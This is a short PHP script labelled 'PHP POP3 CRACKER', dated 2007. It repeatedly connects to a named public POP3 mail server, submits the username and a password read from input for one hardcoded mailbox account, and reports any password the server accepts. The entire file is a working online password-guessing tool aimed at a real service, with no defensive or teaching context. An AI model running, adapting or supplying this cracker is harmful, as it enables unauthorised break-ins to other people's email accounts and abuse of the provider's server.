<?php

//READLINE Function
function readline($prompt="") {
  echo $prompt;
  $line = fgets(STDIN, 999);
  return trim($line);
}
//READLINE End

//CODE
$server = "pop3.seznam.cz";
$port = "110";
$timeout = "5";
$user = "harvie@seznam.cz";
//$pass = "heslo";

echo (
"PHP POP3 CRACKER\nHarvie 2oo7\n"
);

while(1) {
  $fp = fsockopen ($server, $port, &$errno, &$errstr, $timeout);
  //if ($fp) { echo("GOOD CONNECTION\n"); }
  if (!$fp) { echo("BAD CONNECTION\n"); }

  $pass = readline();

  $resp = (" ".fread($fp, 1000));

  fwrite($fp, "USER $user\n");
    $resp = (" ".fread($fp, 1000));
  fwrite($fp, "PASS $pass\n");
    $resp = (" ".fread($fp, 1000));
  if (strpos($resp, "+OK") != 0) {
    echo(
    "\n\n-------------------\n".
    "GOOD PASSWORD FOUND\n".
    "Server: $server:$port\n".
    "USER $user\n".
    "PASS $pass"
    );
    fclose($fp);
    die("\n");
  }
  //if (strpos($resp, "-ERR") != 0) { echo("\nBAD PASSWORD\n"); }
}

?>
